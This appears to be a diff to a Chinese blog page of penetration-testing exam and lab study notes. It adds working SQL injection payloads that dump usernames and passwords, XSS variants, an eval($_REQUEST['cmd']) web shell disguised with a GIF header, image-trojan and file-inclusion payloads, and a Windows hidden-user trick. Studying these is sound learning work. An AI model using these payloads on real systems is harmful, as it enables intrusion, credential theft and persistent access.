@@ -358,11 +358,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">6</span> Minutes
+              Estimated Reading Time <span class="post-count">10</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">1.6k</span> In Total
+              Words <span class="post-count">2.5k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -424,6 +424,15 @@
 <hr>
 <p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231122220002242.png" alt="image-20231122220002242"></p>
 <hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123211313893.png" alt="image-20231123211313893"></p>
+<blockquote>
+<p>怪不得17年开始全国成立那么多网络空间安全学院</p>
+</blockquote>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123211604394.png" alt="image-20231123211604394"></p>
+<blockquote>
+<p><em>“网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，应当要求用户提供真实身份信息。”</em></p>
+<p>原来实名制是这个意思</p>
+</blockquote>
 <h2 id="渗透测试基础">渗透测试基础</h2>
 <p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123130550156.png" alt="image-20231123130550156"></p>
 <blockquote>
@@ -504,16 +513,61 @@
 <hr>
 <p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231122213945025.png" alt="image-20231122213945025"></p>
 <hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123202411537.png" alt="image-20231123202411537"></p>
 <hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123202709077.png" alt="image-20231123202709077"></p>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123203507253.png" alt="image-20231123203507253"></p>
+<blockquote>
+<p>requestreadtimeout用于防止HTTP的慢速请求攻击</p>
+<p><strong>http慢速攻击</strong>是利用http合法机制，在建立连接后，尽量长时间保持连接，不释放，达到对HTTP服务攻击,攻击者发送POST请求，自行构造报文向服务器提交数据，将报文长度设置一个很大的值，且在随后每次发送中，每次只发送一个很小的报文，这样导致服务器一直等待数据，连接始终一直被占用。</p>
+</blockquote>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123204035227.png" alt="image-20231123204035227"></p>
+<blockquote>
+<p>在Linux系统中，文件和目录的权限由一个三位数的数字表示。每个数字对应于文件或目录的不同权限类别。以下是这三个数字的含义：</p>
+<ol>
+<li>第一个数字表示所有者（Owner）的权限。</li>
+<li>第二个数字表示所属组（Group）的权限。</li>
+<li>第三个数字表示其他人（Others）的权限。</li>
+</ol>
+<p>每个数字可以是 0 到 7 之间的一个值，对应于不同的权限组合。以下是每个数字及其对应的权限含义：</p>
+<ul>
+<li>0：没有权限（—）</li>
+<li>1：执行权限（–x）</li>
+<li>2：写权限（-w-）</li>
+<li>3：写和执行权限（-wx）</li>
+<li>4：读权限（r–)</li>
+<li>5：读和执行权限（r-x）</li>
+<li>6：读和写权限（rw-）</li>
+<li>7：读、写和执行权限（rwx）</li>
+</ul>
+<p>日志文件属于很重要的秘密文件，<code>/etc/passwd</code>也仅仅是644</p>
+</blockquote>
+<h2 id="安全事件处置">安全事件处置</h2>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123204413713.png" alt="image-20231123204413713"></p>
+<blockquote>
+<p>必须参照相关管理文件，有理有据，不能参照普通员工建议。</p>
+</blockquote>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123205157714.png" alt="image-20231123205157714"></p>
+<blockquote>
+<p>Windows可以创建隐藏用户：创建用户——&gt;导出注册表——&gt;删除用户——&gt;导入注册表</p>
+</blockquote>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123210018433.png" alt="image-20231123210018433"></p>
 <h1>实验</h1>
 <h2 id="SQL注入-2">SQL注入</h2>
+<p>确认注入点：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">数字型</span><br><span class="line"><span class="attribute">id</span>=1&#x27;			报错(报错说明存在注入点，否则只是查不到，下面判断数字型还是字符型)</span><br><span class="line"><span class="attribute">id</span>=1 <span class="keyword">and</span> <span class="attribute">1</span>=1	不报错</span><br><span class="line"><span class="attribute">id</span>=1 <span class="keyword">and</span> <span class="attribute">1</span>=2	报错</span><br><span class="line">字符型</span><br><span class="line"><span class="attribute">id</span>=1&#x27;				报错</span><br><span class="line"><span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1	不报错</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;2	报错</span></span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=<span class="number">1</span>&#x27; order by <span class="number">1</span>--+</span><br><span class="line"><span class="attribute">id</span>=<span class="number">1</span>&#x27; and <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br><span class="line"><span class="attribute">id</span>=<span class="number">1</span>&#x27; and <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,database()--+</span><br><span class="line"><span class="attribute">id</span>=<span class="number">1</span>&#x27; and <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=&#x27;xxx&#x27;--+</span><br><span class="line"><span class="attribute">column_name</span>/information_schema.columns/table_name</span><br><span class="line"><span class="attribute">id</span>=<span class="number">1</span>&#x27; and <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,concat_ws(&#x27;=&#x27;,username,password) from security.users limit <span class="number">0</span>,<span class="number">1</span>--+</span><br></pre></td></tr></table></figure>
+<hr>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,concat_ws(<span class="string">&#x27;,&#x27;</span>,id,username,password) <span class="keyword">from</span> security.users limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>前者是一个字段的多行记录，用<code>group_concat</code>，后者是一条记录的多个字段，用<code>concat</code>或者<code>concat_ws</code></p>
 <hr>
-<p><code>database()</code> <code>information_schema.tables</code> <code>table_schema</code> <code>information_schema.columns</code> <code>column_name</code></p>
-<hr>
-<p>注释用<code>--</code>时要加空格，有时用<code>+</code>填充</p>
+<p>注释用<code>--</code>时要加空格，有时用<code>+</code>填充，POST注入时用<code>#</code>注入</p>
 <hr>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;#&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
 <p>这样是以<code>admin</code>用户身份登录的</p>
@@ -533,21 +587,27 @@
 <li>
 <p>注意这些只是函数不是语句，不能单独使用，只能用<code>AND</code>去依附某些数据项而使用</p>
 <p><code>id=1','','') and extractvalue(1, concat('~',database()))# </code>（×）</p>
-<p><code>id=1'AND extractvalue(1, concat('~',database())),'')#</code>（√）</p>
+<p><code>id=1' AND extractvalue(1, concat('~',database())),'')#</code>（√）</p>
 <p><code>AND</code>在这里用于形成布尔表达式</p>
 </li>
 </ul>
-<hr>
 <p><code>extractvalue</code>报错注入时，返回最大字符长度为32，常使用<code>limit</code>函数限制逐条读取，记得不加<code>group_concat</code>函数</p>
 <hr>
 <p><code>floor</code>函数报错注入参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/8472323.html">Floor报错原理分析 - ka1n4t - 博客园 (cnblogs.com)</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect">Mysql报错注入原理分析(count()、rand()、group by) (qq.com)</a></p>
 <p><code>floor(rand(0)*2)</code>提供报错因子，<code>group by</code>和<code>count</code>提供报错环境</p>
 <p>payload：<code>id=1' and (select 1 from (select count(*),concat(database(),'===',floor(rand(0)*2)) as x from information_schema.tables group by x)y)--+</code></p>
+<p><code>id=1' and (select 1 from(select count(*),concat(database(),'=',floor(rand(0)*2))x from xxx gruop by x)y)--+</code></p>
 <p>Mysql规定用户新提取出的临时表必须有别名，所以要加一个<code>y</code>；报错<code>select</code>语句的表可以是任意数据库中存在的表；最后套上一个<code>select 1 from</code>后加上括号就可以了</p>
 <hr>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; and length(database())=7--+</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> substr(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>)=<span class="string">&#x27;e&#x27;</span><span class="comment">--+</span></span><br><span class="line">id=<span class="number">1</span><span class="string">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; limit 0,1),2,1)=&#x27;</span><span class="string">e&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(substr(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <p>手工进行布尔盲注时，应该使用<code>limit</code>函数一项一项地爆破，比如一下子返回了好几个表名，但是没有使用<code>concat</code>函数族拼接在一起，直接进行字符串的<code>substr</code>操作就会发生语法错误</p>
 <hr>
+<h2 id="XSS-2">XSS</h2>
+<p>几种payload变形</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&quot;</span><span class="attr">xss</span>&quot;);&quot;&gt;</span> this is a xss <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">xxx.com.xx</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br><span class="line">大小写</span><br><span class="line">/ 代替空格</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">xxx.com.xx</span> <span class="attr">onerror</span>		=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span> 加回车</span><br><span class="line">编码</span><br></pre></td></tr></table></figure>
 <h2 id="文件上传">文件上传</h2>
+<p><code>::$DATA</code></p>
+<hr>
 <p><code>.htaccess</code>的三种写法</p>
 <ol>
 <li>
@@ -565,7 +625,7 @@
 </ol>
 <hr>
 <p><code>GIF</code>的文件头是<code>GIF89a</code>，可以直接在php文件的最上面添加</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>其他的文件头绕过的图片马制作命令是</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+1.php/a 2.jpg</span><br><span class="line"><span class="meta">#</span><span class="bash"> 参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件(bin)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件(ascii)</span></span><br></pre></td></tr></table></figure>
 <hr>
@@ -602,6 +662,15 @@
 <p>Tomcat默认配置<code>readyonly=true</code>，不允许<code>DELETE</code>和<code>PUT</code>请求头，但如果改成false，可以通过<code>PUT</code>方法上传<code>JSP</code>文件，执行任意代码，注意在请求报文修改请求头为<code>PUT</code>，路径文件名后面加空格（<code>%20</code>）绕过后缀名过滤</p>
 </li>
 </ol>
+<hr>
+<h2 id="文件包含">文件包含</h2>
+<p>通过参数传递文件地址</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本地：a=…<span class="regexp">/01/</span><span class="number">1</span>.jpg</span><br><span class="line">远程：a=http:<span class="regexp">//</span>操作机ip/include.php</span><br><span class="line">也可以不包含可执行文件（php），包含一些敏感文件（日志），只是为了在前端读取</span><br></pre></td></tr></table></figure>
+<hr>
+<p>PHP伪协议</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">page=php:<span class="regexp">//i</span>nput	参数通过POST传递</span><br><span class="line">page=zip:<span class="regexp">//</span>C:<span class="regexp">/server/</span>apache22<span class="regexp">/htdocs/u</span>p<span class="regexp">/upload/i</span>nfo.zip%<span class="number">23</span>info.txt	绝对路径，空格转%<span class="number">23</span></span><br><span class="line">page=data:<span class="regexp">//</span>text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">page=phar:<span class="regexp">//</span>…<span class="regexp">/up/u</span>pload<span class="regexp">/info.zip/i</span>nfo.txt	绝对路径和相对路径均可</span><br><span class="line">可以通过报错暴露网站目录结构</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id=""></h2>
 
 
         <hr>
@@ -708,7 +777,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">客观题</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">网络安全概述</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">渗透测试基础</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#HTTP"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">HTTP</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#XSS"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">XSS</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">命令执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%9F%BA%E7%BA%BF%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">基线配置</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">实验</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">文件上传</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">客观题</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">网络安全概述</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">渗透测试基础</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#HTTP"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">HTTP</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#XSS"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">XSS</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">命令执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%9F%BA%E7%BA%BF%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">基线配置</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">安全事件处置</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">实验</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#XSS-2"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">XSS</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">文件上传</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">文件包含</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link"><span class="toc-nav-number">2.5.</span> <span class="toc-nav-text"></span></a></li></ol></li></ol>
         
         </div>
       </aside>
